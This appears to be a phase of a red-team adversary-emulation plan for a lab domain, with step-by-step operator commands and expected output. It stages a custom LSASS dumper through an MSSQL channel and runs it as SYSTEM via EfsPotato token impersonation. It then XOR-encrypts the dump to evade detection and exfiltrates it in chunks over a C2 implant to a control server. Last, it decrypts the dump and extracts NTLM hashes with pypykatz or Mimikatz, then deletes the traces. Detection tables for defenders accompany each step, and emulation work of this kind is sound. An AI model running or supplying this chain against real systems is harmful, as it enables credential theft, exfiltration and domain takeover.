# Phase 3 — Credential Access: LSASS Reflection Dump via SYSTEM Context

<!-- CTI references used in this phase. Number them here; cite with [N] in the Reference Tables below. -->

---

## Step 0 — Setup

### Procedures

- Confirm Phase 2 completion — SYSTEM privilege verified on IIS01 (`C:\ProgramData\sys_out.txt` shows `SeDebugPrivilege` Enabled)
- Confirm `CertEnrollSvc.exe` is still present on IIS01 (not cleaned up between phases):

  ```
  xpshell cmd dir C:\ProgramData\CertEnrollSvc.exe
  ```

- Build `ReflectDump.exe` if not already built — see [`resources/payloads/cred-access/LsassReflectDumping/Build.md`](../resources/payloads/cred-access/LsassReflectDumping/Build.md):

  ```cmd
  cd resources\payloads\cred-access\LsassReflectDumping\ReflectDump
  msbuild ReflectDump.sln /p:Configuration=Release /p:Platform=x64 /m
  ```

  > Output: `ReflectDump\x64\Release\ReflectDump.exe`

- Stage `ReflectDump.exe` to the controlServer `toneshell` payloads subdirectory (required by `xpstage`):

  ```bash
  cp resources/payloads/cred-access/LsassReflectDumping/ReflectDump/x64/Release/ReflectDump.exe \
     resources/payloads/rce-and-c2/mustang-panda-emulation/payloads/toneshell/ReflectDump.exe
  ```

---

## Step 1 — Staging: Transfer ReflectDump.exe to IIS01 via MSSQL DB Channel

### Voice Track

With SYSTEM execution confirmed on IIS01, the adversary stages the LSASS dump tool through the same covert database channel used to deliver CertEnrollSvc.exe in Phase 2. The controlServer AES-256-CBC encrypts `ReflectDump.exe` and generates a T-SQL INSERT script that chunks the ciphertext as base64 rows. The TONESHELL implant on WS01 receives the SQL file via the C2 file-push channel, then `sqlcmd` bulk-inserts the chunks into a staging table in `tempdb`. A PowerShell decrypt script written via `sp_OA` FileSystemObject and executed under `xp_cmdshell` reads the rows, decrypts the payload in-memory, and writes the binary to `C:\ProgramData\`. The staging table is dropped and the SQL file deleted on completion — no HTTP egress from IIS01.

### Procedures

1. ☣️ Stage `ReflectDump.exe` to IIS01 via the DB channel:

   ```
   xpstage ReflectDump.exe
   ```

   Same mechanism as Phase 2 Step 4A:
   - controlServer AES-256-CBC encrypts `ReflectDump.exe`, generates INSERT SQL
   - SQL file pushed to `C:\Windows\Temp\` on WS01 via TONESHELL FILE_DOWNLOAD
   - WS01 `sqlcmd -i` bulk-INSERTs base64 chunks into `tempdb..stg` on IIS01
   - PowerShell decrypt script written via sp_OA, executed via `xp_cmdshell psh`, AES-decrypts rows and writes binary to `C:\ProgramData\`
   - SQL file deleted from WS01; `tempdb..stg` dropped

   - ***Expected Output***
     ```text
     [+] xpstage done → C:\ProgramData\ReflectDump.exe
     ```

2. Verify the binary landed on IIS01:

   ```
   xpshell cmd dir C:\ProgramData\ReflectDump.exe
   ```

   - ***Expected Output***
     ```text
     ...  ReflectDump.exe
     ```

### Reference Tables

<!-- Mechanism behaviors (TONESHELL FILE_DOWNLOAD → sqlcmd INSERT → sp_OA write → xp_cmdshell psh → cleanup) are identical to Phase 2 Step 3 and are not re-scored here. -->

---

## Step 2 — Credential Access: LSASS Reflection Dump via EfsPotato SYSTEM Context

### Voice Track

With `ReflectDump.exe` staged to `C:\ProgramData\`, the adversary invokes the dump tool through the same EfsPotato named-pipe impersonation primitive used in Phase 2 — this time with ReflectDump as the payload process. `CertEnrollSvc.exe` creates an attacker-controlled named pipe, coerces LSASS to connect via `EfsRpcEncryptFileSrv` on the `lsarpc` endpoint, captures the SYSTEM impersonation token via `FSCTL_PIPE_IMPERSONATE` and `NtOpenThreadToken`, duplicates it to a primary token via `NtDuplicateToken`, and calls `CreateProcessWithTokenW` — spawning `ReflectDump.exe` as `NT AUTHORITY\SYSTEM`. Running with full SYSTEM privilege, ReflectDump first checks its own token elevation, then allocates a 75 MB heap buffer for the in-memory capture before any cross-process activity begins. It locates `lsass.exe` via `EnumProcesses` with `PROCESS_QUERY_LIMITED_INFORMATION` per PID (no Toolhelp32 snapshot), opens a handle with the `~0x4FA` reflection-access mask, and forks LSASS into a suspended reflection clone via `RtlCreateProcessReflection` — resolved char-by-char at runtime from `ntdll.dll`, absent from the static IAT. The tool loads `dbghelp.dll` at runtime via `LoadLibraryA` and captures the full minidump into the heap buffer through a `MiniDumpWriteDump` callback that intercepts all I/O in-memory. A position-dependent linear XOR pass encrypts the buffer in-place before any byte reaches disk, stripping MDMP magic bytes and credential strings. The encrypted buffer is flushed to `%TEMP%\~DFxxxx.tmp` under an MS Office temp filename pattern; ReflectDump prints the full path to stdout and terminates the reflection clone. Stdout is redirected to `C:\ProgramData\rdump_out.txt` for retrieval.

### Procedures

1. ☣️ Execute LSASS reflection dump via EfsPotato SYSTEM impersonation:

   ```
   xpshell cmd C:\ProgramData\CertEnrollSvc.exe "cmd /c C:\ProgramData\ReflectDump.exe > C:\ProgramData\rdump_out.txt 2>&1" lsarpc 0<nul
   ```

   - `CertEnrollSvc.exe` triggers EFS named-pipe coercion, captures SYSTEM token, spawns `ReflectDump.exe` via `CreateProcessWithTokenW`
   - `ReflectDump.exe` runs as `NT AUTHORITY\SYSTEM`: queries own token, allocates heap, locates LSASS, opens handle `~0x4FA`, forks reflection clone via `RtlCreateProcessReflection`, dumps to heap via MiniDump callback, XOR-encrypts in-place, flushes to `%TEMP%\~DFxxxx.tmp`
   - Reflection clone terminated; stdout (dump path) redirected to `C:\ProgramData\rdump_out.txt`
   - `0<nul` prevents EfsPotato from entering PE-from-stdin mode under `xp_cmdshell`'s pipe stdin

2. Retrieve the dump file path:

   ```
   xpshell cmd type C:\ProgramData\rdump_out.txt
   ```

   - ***Expected Output***
     ```text
     C:\Windows\system32\config\systemprofile\AppData\Local\Temp\~DF1A2B.tmp
     ```

   > The SYSTEM account's `%TEMP%` resolves to `C:\Windows\system32\config\systemprofile\AppData\Local\Temp\`. Record the exact filename — the hex suffix is randomized per run.

3. Verify the dump file is non-zero size (~50–75 MB depending on LSASS working set):

   ```
   xpshell cmd dir "C:\Windows\system32\config\systemprofile\AppData\Local\Temp\~DF1A2B.tmp"
   ```

   - ***Expected Output***
     ```text
     ...   52,428,800  ~DF1A2B.tmp
     ```

### Reference Tables

| Summary | Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Calibration Reason | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports |
| - | - | - | - | - | - | - | - | - | - | - | - | - |
| ReflectDump.exe queries own token elevation as pre-flight check | Discovery | T1069.001 | Permission Groups Discovery: Local Groups | Windows | N/A - C2: `OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY)` + `GetTokenInformation(TokenElevation)` is a pure in-process self-query — no external artifact, file, registry key, or network event produced; evaluator cannot independently verify the token-query step without trusting the binary; the process execution event itself is attributed to T1106 (CreateProcessWithTokenW spawn) | Not Calibrated - Not Benign | C2 | `ReflectDump.exe` calls token self-query on the current process to verify elevated context before any cross-process activity | IIS01 (10.12.10.20) | NT AUTHORITY\SYSTEM | [LsassReflectDumping](../resources/payloads/cred-access/LsassReflectDumping) | — |
| ReflectDump.exe LSASS memory access chain: pre-allocates 75 MB heap buffer, opens lsass.exe handle with reflection access mask ~0x4FA, forks suspended reflection clone via RtlCreateProcessReflection, and captures full minidump into heap via MiniDumpWriteDump IoWriteAllCallback | Credential Access | T1003.001 | OS Credential Dumping: LSASS Memory | Windows | `ReflectDump.exe` (child of `CertEnrollSvc.exe`, NT AUTHORITY\SYSTEM) opens `lsass.exe` with access mask `0x4FA` (`PROCESS_CREATE_PROCESS\|PROCESS_CREATE_THREAD\|PROCESS_DUP_HANDLE\|PROCESS_QUERY_INFORMATION\|PROCESS_VM_OPERATION\|PROCESS_VM_READ\|PROCESS_VM_WRITE` — composite REFLECT_ACCESS defined in source, not the common Mimikatz `0x1010` or `PROCESS_ALL_ACCESS 0x1FFFFF`) — Sysmon EC=10 on `lsass.exe` target, GrantedAccess=0x4FA; `RtlCreateProcessReflection` (resolved char-by-char from ntdll) then spawns a clone with `lsass.exe` as ParentProcessId — Sysmon EC=1; `MiniDumpWriteDump(MiniDumpWithFullMemory)` is called with file handle argument = NULL and a heap-resident `IoWriteAllCallback` — all minidump I/O goes to the 75 MB heap buffer, no Sysmon EC=11 at dump time | Calibrated - Not Benign | - | `ReflectDump.exe` (1) commits a 75 MB private heap region before any cross-process access; (2) calls `OpenProcess(~0x4FA)` on lsass.exe — reflection-specific mask, not full `0x1FFFFF` (Sysmon EC=10 on lsass.exe target); (3) `RtlCreateProcessReflection` forks a suspended clone — Sysmon EC=1 with lsass.exe as parent; (4) `MiniDumpWriteDump(MiniDumpWithFullMemory)` via `IoWriteAllCallback` writes exclusively to heap buffer — no file handle at dump time | IIS01 (10.12.10.20) | NT AUTHORITY\SYSTEM | [LsassReflectDumping](../resources/payloads/cred-access/LsassReflectDumping) | — |
| ReflectDump.exe enumerates processes to locate lsass.exe via EnumProcesses + PROCESS_QUERY_LIMITED_INFORMATION | Discovery | T1057 | Process Discovery | Windows | `ReflectDump.exe` calls `EnumProcesses` then `OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid)` + `QueryFullProcessImageNameW` per PID in a tight loop to locate `lsass.exe` — when the loop reaches lsass.exe's PID, Sysmon EC=10 fires with GrantedAccess=0x1000 (`PROCESS_QUERY_LIMITED_INFORMATION`) on `lsass.exe` target; `CreateToolhelp32Snapshot` is deliberately avoided (source comment: "less-watched API path"); the 0x1000 access on lsass.exe occurs immediately before the separate 0x4FA REFLECT_ACCESS open attributed to T1003.001 | Not Calibrated - Not Benign | native-recon | `ReflectDump.exe` calls `EnumProcesses` + `OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION)` per PID to locate `lsass.exe`; avoids Toolhelp32 snapshot | IIS01 (10.12.10.20) | NT AUTHORITY\SYSTEM | [LsassReflectDumping](../resources/payloads/cred-access/LsassReflectDumping) | — |
| ReflectDump.exe resolves RtlCreateProcessReflection and MiniDumpWriteDump via runtime char-arrays; loads dbghelp.dll via LoadLibraryA — all absent from static IAT | Stealth | T1027.007 | Obfuscated Files or Information: Dynamic API Resolution | Windows | Two on-surface signals: (1) Sysmon EC=7 — `ReflectDump.exe` loads `dbghelp.dll` via `LoadLibraryA` at runtime (char array `'d','b','g','h','e','l','p','.','d','l','l'` in source); `dbghelp.dll` is absent from the binary's static import table — anomalous module load in an IIS01/MSSQL SYSTEM process context; (2) YARA / capability scan on the `ReflectDump.exe` binary: static PE import table contains no entry for `dbghelp.dll`, `MiniDumpWriteDump`, or `RtlCreateProcessReflection` — a sparse IAT for a process whose sole function involves those APIs; `RtlCreateProcessReflection` string built as inline char array (`'R','t','l','C','r','e','a','t','e','P','r','o','c','e','s','s','R','e','f','l','e','c','t','i','o','n'`) and `MiniDumpWriteDump` similarly (`'M','i','n','i','D','u','m','p','W','r','i','t','e','D','u','m','p'`) — both matchable as raw byte strings in the on-disk or in-memory PE image | Calibrated - Not Benign | - | API names `RtlCreateProcessReflection` (ntdll.dll) and `MiniDumpWriteDump` (dbghelp.dll) built char-by-char at runtime — absent from static PE import table; `dbghelp.dll` loaded via `LoadLibraryA` at runtime — module-load event (Sysmon EC=7) on `dbghelp.dll` in non-debug, non-sysadmin process context | IIS01 (10.12.10.20) | NT AUTHORITY\SYSTEM | [LsassReflectDumping](../resources/payloads/cred-access/LsassReflectDumping) | — |
| ReflectDump.exe creates suspended lsass.exe reflection clone via RtlCreateProcessReflection and terminates it via TerminateProcess after dump completes | Execution | T1106 | Native API | Windows | (1) `RtlCreateProcessReflection` (resolved char-by-char from ntdll via `GetProcAddress`) forks a lsass.exe clone with flag `RTL_CLONE_PROCESS_FLAGS_INHERIT_HANDLES` (0x2) — new process appears in Sysmon EC=1 with `lsass.exe` (parent) → clone child process chain; `lsass.exe` should never spawn child processes in a clean environment; clone PID is sourced from `T_RTLP_PROCESS_REFLECTION_REFLECTION_INFORMATION.ReflectionClientId.UniqueProcess`; (2) `TerminateProcess(hReflectionProcess, 0)` terminates the clone after `MiniDumpWriteDump` completes — Sysmon EC=5 on the clone PID; handle is reused from the reflection info struct, so no second `OpenProcess` on the clone (no additional EC=10 event) | Calibrated - Not Benign | - | (1) `RtlCreateProcessReflection` (resolved char-by-char from ntdll) creates a suspended reflection clone of lsass.exe — Sysmon EC=1 with lsass.exe as parent, clone PID is the MiniDumpWriteDump target; (2) `TerminateProcess` called on clone handle after dump completes — Sysmon EC=5 on clone PID | IIS01 (10.12.10.20) | NT AUTHORITY\SYSTEM | [LsassReflectDumping](../resources/payloads/cred-access/LsassReflectDumping) | — |
| ReflectDump.exe writes XOR-encrypted dump buffer to %TEMP%\~DFxxxx.tmp | Stealth | T1027.013 | Obfuscated Files or Information: Encrypted/Encoded File | Windows | `ReflectDump.exe` (NT AUTHORITY\SYSTEM) applies position-dependent XOR in-place on the 75 MB heap buffer (`p[i] ^= (BYTE)((0xA3 + i * 0x5B) & 0xFF)` — fixed key, stripping MDMP magic bytes at offset 0: byte 0 `0x4D XOR 0xA3 = 0xEE`), then writes the result via `CreateFileW` to `C:\Windows\system32\config\systemprofile\AppData\Local\Temp\~DFxxxx.tmp` — Sysmon EC=11 on SYSTEM account TEMP path from `ReflectDump.exe`; the written file is ~50–75 MB with no valid MDMP or PE header at offset 0; YARA on disk: ~50–75 MB `.tmp` file in `C:\Windows\system32\config\systemprofile\AppData\Local\Temp\` lacking MDMP signature (`4D 44 4D 50`) at offset 0, written by a non-system process running as NT AUTHORITY\SYSTEM | Calibrated - Not Benign | - | Linear XOR `b ^ ((0xA3 + i * 0x5B) & 0xFF)` applied in-place on heap buffer, then flushed to `C:\Windows\system32\config\systemprofile\AppData\Local\Temp\~DFxxxx.tmp`; filename matches MS Office/shell temp naming pattern; path printed to stdout | IIS01 (10.12.10.20) | NT AUTHORITY\SYSTEM | [LsassReflectDumping](../resources/payloads/cred-access/LsassReflectDumping) | — |
| ReflectDump.exe writes XOR-encrypted dump buffer to %TEMP%\~DFxxxx.tmp | Stealth | T1036.005 | Masquerading: Match Legitimate Resource Name or Location | Windows | `ReflectDump.exe` generates output filename via `GetTempFileNameW(tmpDir, L"DF", 0, tmpFile)` — produces `~DFxxxx.tmp` pattern (`DF` prefix + 4-digit hex suffix + `.tmp`) matching the MS Office / Windows shell temp file convention; Sysmon EC=11 on `C:\Windows\system32\config\systemprofile\AppData\Local\Temp\~DF*.tmp` from `ReflectDump.exe` (NT AUTHORITY\SYSTEM); the written file is ~50–75 MB — anomalous against legitimate `~DFxxxx.tmp` files which are sub-megabyte workspace temporaries created by Office or shell processes, not by a SYSTEM-context non-Office binary | Calibrated - Not Benign | - | Linear XOR `b ^ ((0xA3 + i * 0x5B) & 0xFF)` applied in-place on heap buffer, then flushed to `C:\Windows\system32\config\systemprofile\AppData\Local\Temp\~DFxxxx.tmp`; filename matches MS Office/shell temp naming pattern; path printed to stdout | IIS01 (10.12.10.20) | NT AUTHORITY\SYSTEM | [LsassReflectDumping](../resources/payloads/cred-access/LsassReflectDumping) | — |

---

## Step 3 — Collection: Dump Exfiltration via MSSQL DB Channel

### Voice Track

The XOR-encrypted dump sits in the SYSTEM account's TEMP directory on IIS01. The adversary reads it out through the database channel in 8 MB chunks to avoid TCP port exhaustion — a single 76 MB upload would require ~18,637 sequential TCP connections that can exhaust the Windows ephemeral port range, truncating the file. For each chunk, a PowerShell script staged to IIS01 via sp_OA FileSystemObject opens the dump file, seeks to the chunk offset via `FileStream.Seek`, reads only the window length, AES-256-CBC encrypts the bytes with a session key generated on the controlServer (random IV prepended), then base64-encodes the encrypted blob via `System.Security.Cryptography.ToBase64Transform` and bulk-INSERTs 8000-char NVARCHAR rows into a fresh `tempdb..exfil` table via SqlClient. From WS01, a PowerShell script issued via TONESHELL EXEC opens a SqlClient connection to `tempdb`, reads and concatenates all `exfil` rows, passes the result through `FromBase64Transform` to decode, AES-decrypts the blob, and writes the plaintext chunk to `C:\Windows\Temp\rdump.tmp.chunk{i}`. The staging table is dropped and the WS01 chunk file deleted after each per-chunk TONESHELL FILE_UPLOAD completes — each pull carries ~8 MB (~2,048 TCP connections), with the interval between pulls allowing TIME_WAIT ports to drain. After all N chunks are confirmed on the controlServer, Python concatenates the chunk files into `files/rdump.tmp` and removes them. The dump file on IIS01 is deleted once exfil is confirmed.

### Procedures

1. ☣️ Exfil the encrypted dump from IIS01 to controlServer via chunked tempdb INSERT channel:

   ```
   xpexfil "C:\Windows\system32\config\systemprofile\AppData\Local\Temp\~DF1A2B.tmp" rdump.tmp 600 8
   ```

   This performs, for each 8 MB chunk (10 chunks for a ~76 MB dump):
   - Python queries `(Get-Item <path>).Length` via `xp_cmdshell` to compute `num_chunks = ceil(76 343 506 / 8 MB) = 10`
   - PowerShell on IIS01 (via `xpshell psh`): opens dump via `[IO.File]::OpenRead`, `FileStream.Seek(offset)` + `Read(length)`, AES-256-CBC encrypts with session key (IV prepended), `ToBase64Transform`-encodes, INSERTs 8000-char rows into `tempdb..exfil` via SqlClient
   - Python polls `OBJECT_ID('tempdb..exfil')` every 15 s until INSERT is confirmed
   - WS01 PowerShell (TONESHELL EXEC): reads `tempdb..exfil` via SqlClient, `FromBase64Transform`-decodes, AES-decrypts, writes `C:\Windows\Temp\rdump.tmp.chunk{i}`
   - `tempdb..exfil` dropped; TONESHELL FILE_UPLOAD with `fileName=rdump.tmp.chunk{i}` pulls chunk to `controlServer/files/rdump.tmp.chunk{i}`; chunk file deleted from WS01
   - After all 10 chunks: Python assembles `files/rdump.tmp.chunk0..9` → `files/rdump.tmp`; chunk files removed

   - ***Expected Output***
     ```text
     [*] xpexfil: 76343506 bytes → 10 chunk(s) of 8 MB each
     [*] xpexfil: chunk 1/10 — INSERT (offset=0, len=8388608) ...
     ...
     [*] xpexfil: assembling 10 chunk(s) on C2 ...
     [+] xpexfil done → /path/to/controlServer/files/rdump.tmp
     ```

2. ☣️ Delete the dump file from IIS01 SYSTEM TEMP:

   ```
   xpshell cmd del /f "C:\Windows\system32\config\systemprofile\AppData\Local\Temp\~DF1A2B.tmp"
   ```

3. Delete the EfsPotato output file:

   ```
   xpshell cmd del /f C:\ProgramData\rdump_out.txt
   ```

### Reference Tables

| Summary | Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Calibration Reason | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports |
| - | - | - | - | - | - | - | - | - | - | - | - | - |
| PowerShell FileStream chunk read, AES-256-CBC encryption, and SqlClient INSERT into tempdb..exfil on IIS01 | Stealth | T1027.013 | Obfuscated Files or Information: Encrypted/Encoded File | Windows | `powershell.exe` (child of `sqlservr.exe` via xp_cmdshell) executes a transient `.ps1` written to `C:\ProgramData\` by `NT SERVICE\MSSQL$SQLEXPRESS` via sp_OA — script applies `[System.Security.Cryptography.Aes]::Create()` CBC-mode encryption to each FileStream-read dump chunk before SqlClient INSERT into `tempdb..exfil`; encryption step witnessed via PowerShell ScriptBlockLogging; `.ps1` file creation also observable as Sysmon EC=11 from MSSQL service account on `C:\ProgramData\` | Calibrated - Not Benign | - | Per chunk: PowerShell opens dump via `[IO.File]::OpenRead`, `FileStream.Seek(offset)+Read(length)` reads only the chunk window, AES-256-CBC encrypts (IV prepended), `ToBase64Transform`-encodes, INSERTs 8000-char rows into `tempdb..exfil` via SqlClient loopback; repeats N times | IIS01 (10.12.10.20) | NT SERVICE\MSSQL$SQLEXPRESS | [toneshell_shell.py](../resources/payloads/rce-and-c2/mustang-panda-emulation/controlServer/toneshell_shell.py) | — |
| IIS01 AES-encrypts and SqlClient-INSERTs dump chunk into tempdb..exfil; WS01 SqlClient-reads, decodes, and writes rdump.tmp.chunk{i} — per-chunk local data staging on both endpoints | Collection | T1074.001 | Data Staged: Local Data Staging | Windows | (IIS01) `powershell.exe` (child of `sqlservr.exe` via xp_cmdshell) opens loopback TCP connection to `127.0.0.1:1433` and INSERTs base64-encoded AES ciphertext rows into `tempdb..exfil` — chunked dump staging into SQL table repeated N times (Sysmon EC=3: `powershell.exe` → `127.0.0.1:1433`); (WS01) `powershell.exe` (spawned via TONESHELL EXEC) connects to IIS01 TCP/1433 and writes `C:\Windows\Temp\<name>.chunk{N}` — `.chunk{N}` suffix is hardcoded in `xpexfil` (non-standard extension), Sysmon EC=11 file-create per chunk cycle | Not Calibrated - Not Benign | staging | (IIS01) Per chunk: PowerShell `[IO.File]::OpenRead` + `FileStream.Seek(offset)+Read(length)`, AES-256-CBC encrypt (IV prepended), `ToBase64Transform`-encode, SqlClient INSERT 8000-char rows into `tempdb..exfil` loopback; (WS01) Per chunk: PowerShell (TONESHELL EXEC) SqlClient open to `tempdb`, concatenate `exfil` rows, `FromBase64Transform`-decode via CryptoStream, AES-decrypt, write `C:\Windows\Temp\rdump.tmp.chunk{i}`; repeats N times | IIS01 (10.12.10.20), WS01 (10.12.10.30) | NT SERVICE\MSSQL$SQLEXPRESS (IIS01), TESTLAB\labuser (WS01) | [toneshell_shell.py](../resources/payloads/rce-and-c2/mustang-panda-emulation/controlServer/toneshell_shell.py) | — |
| WS01 PowerShell FromBase64Transform-decodes and AES-decrypts tempdb..exfil rows to rdump.tmp.chunk{i} | Stealth | T1140 | Deobfuscate/Decode Files or Information | Windows | `powershell.exe` on WS01 (TONESHELL EXEC) executes a script containing `New-Object System.Security.Cryptography.FromBase64Transform` + `[System.Security.Cryptography.Aes]::Create()` decryption of MSSQL-sourced rows, writing the plaintext chunk to `C:\Windows\Temp\<name>.chunk{N}` — decode/decrypt step witnessed via PowerShell ScriptBlockLogging; the resulting chunk file (plaintext dump segment) is the on-disk artifact | Calibrated - Not Benign | - | Per chunk: WS01 PowerShell (TONESHELL EXEC) opens SqlClient to `tempdb`, concatenates `exfil` rows, `FromBase64Transform`-decodes via CryptoStream, AES-decrypts, writes `C:\Windows\Temp\rdump.tmp.chunk{i}`; exfil uses MSSQL TCP/1433 channel | WS01 (10.12.10.30) | TESTLAB\labuser | [toneshell_shell.py](../resources/payloads/rce-and-c2/mustang-panda-emulation/controlServer/toneshell_shell.py) | — |
| tempdb..exfil dropped on IIS01 per chunk after EXTRACT | Stealth | T1070 | Indicator Removal | Windows | `sqlcmd.exe` spawned on WS01 (via TONESHELL EXEC / `cmd_exec_raw`) with `-Q` argument containing `DROP TABLE tempdb..exfil` — table name `tempdb..exfil` is hardcoded in `xpexfil` source; command-line captured in Sysmon EC=1 on WS01; executed per-chunk after EXTRACT to reset staging table before next INSERT cycle | Not Calibrated - Not Benign | staging | Per chunk: `DROP TABLE tempdb..exfil` issued via sqlcmd after WS01 EXTRACT completes and before next chunk INSERT; table must not exist at the start of each new INSERT cycle | IIS01 (10.12.10.20) | sa | — | — |
| TONESHELL per-chunk FILE_UPLOAD streams rdump.tmp.chunk{i} from WS01 to controlServer | Exfiltration | T1041 | Exfiltration Over C2 Channel | Windows | TONESHELL implant process on WS01 reads `C:\Windows\Temp\<name>.chunk{N}` and transfers the file content over the established C2 session (TS_FILE_UPLOAD packet id=7) — per-chunk transfer produces ~8 MB of sustained outbound data on the C2 channel per cycle; 10 FILE_UPLOAD cycles for a 76 MB dump generate significantly elevated outbound volume compared to normal EXEC command-response traffic | Not Calibrated - Not Benign | C4b: FILE_UPLOAD over established C2 channel; volume anomaly beyond Sysmon EDR surface | Per chunk: TONESHELL `FILE_UPLOAD` task with explicit `fileName=rdump.tmp.chunk{i}` streams `C:\Windows\Temp\rdump.tmp.chunk{i}` to `controlServer/files/rdump.tmp.chunk{i}` over established C2 session; ~2,048 TCP connections per 8 MB chunk (10 pulls total for 76 MB dump) | WS01 (10.12.10.30) | TESTLAB\labuser | [toneshell_shell.py](../resources/payloads/rce-and-c2/mustang-panda-emulation/controlServer/toneshell_shell.py) | — |
| Chunk file rdump.tmp.chunk{i} deleted from WS01 per chunk; XOR dump file ~DFxxxx.tmp deleted from IIS01 SYSTEM TEMP after exfil confirmed | Stealth | T1070.004 | Indicator Removal: File Deletion | Windows | (WS01) `cmd.exe` spawned via TONESHELL EXEC deletes `C:\Windows\Temp\<name>.chunk{N}` via `del /f` after FILE_UPLOAD FINISHED — Sysmon EC=23 (FileDelete) on `.chunk{N}` file in `C:\Windows\Temp\`, or EC=1 `cmd.exe` with `del /f` matching `.chunk{N}` path; (IIS01) `cmd.exe` child of `sqlservr.exe` (via xp_cmdshell) deletes `~DFxxxx.tmp` from `C:\Windows\system32\config\systemprofile\AppData\Local\Temp\` — Sysmon EC=23 on SYSTEM TEMP `.tmp` file deletion by MSSQL service account context, or EC=1 `cmd.exe del /f` on SYSTEM TEMP path | Not Calibrated - Not Benign | staging | (WS01) Per chunk: `cmd /c del /f C:\Windows\Temp\rdump.tmp.chunk{i}` after TONESHELL FILE_UPLOAD confirmed FINISHED; (IIS01) `~DFxxxx.tmp` deleted from `C:\Windows\system32\config\systemprofile\AppData\Local\Temp\` via `xp_cmdshell del /f` after all chunks exfil confirmed | WS01 (10.12.10.30), IIS01 (10.12.10.20) | TESTLAB\labuser (WS01), NT SERVICE\MSSQL$SQLEXPRESS (IIS01) | — | — |

---

## Step 4 — Credential Access: Offline Decryption and Credential Parsing

### Voice Track

With `rdump.tmp` on the attacker machine, the adversary decrypts the XOR-encoded dump using the shared linear-key decoder — the same scheme documented in the LsassReflectDumping README and applied consistently across NtdsRawDump and CWLHerpaderping artifacts in this plan. Once the MDMP header is restored, the dump is parsed offline with `pypykatz` or `Mimikatz sekurlsa::minidump` — no network connection to the lab required. The adversary extracts NTLM hashes, Kerberos TGT material, and any cleartext credentials still retained in LSASS (WDigest cached entries or SSP-forwarded credentials), targeting domain administrator and privileged service account material needed for subsequent phases. Dump files are deleted from the attacker machine after credential extraction.

### Procedures

1. Decrypt the XOR-encoded dump on the attacker machine:

   ```python
   python3 -c "
   import sys
   data = open('rdump.tmp', 'rb').read()
   open('lsass.dmp', 'wb').write(
       bytes(b ^ ((0xA3 + i * 0x5B) & 0xFF) for i, b in enumerate(data))
   )"
   ```

2. ☣️ Parse credential material from the restored minidump:

   ```bash
   pypykatz lsa minidump lsass.dmp
   ```

   Or via Mimikatz:

   ```
   mimikatz # sekurlsa::minidump lsass.dmp
   mimikatz # sekurlsa::logonPasswords full
   ```

   - ***Expected Output*** (relevant excerpt)
     ```text
     Authentication Id : 0 ; 123456 (00000000:0001e240)
     Session           : Interactive from 1
     UserName          : Administrator
     Domain            : TESTLAB
     LogonType         : Interactive
     ...
     MSV:
       [00000003] Primary
       * Username : Administrator
       * Domain   : TESTLAB
       * NTLM     : <hash>
       * SHA1     : <hash>
     Kerberos:
       * Username : Administrator
       * Domain   : TESTLAB.LOCAL
       * Password : (null)
     ```

3. Record harvested domain administrator NTLM hash and any cleartext credentials for use in Phase 4.

4. Delete dump files from the attacker machine:

   ```bash
   rm rdump.tmp lsass.dmp
   ```

### Reference Tables

<!-- All Step 4 behaviors execute on the attacker machine (outside the lab). Off the declared Surface Profile — not scored. -->

---
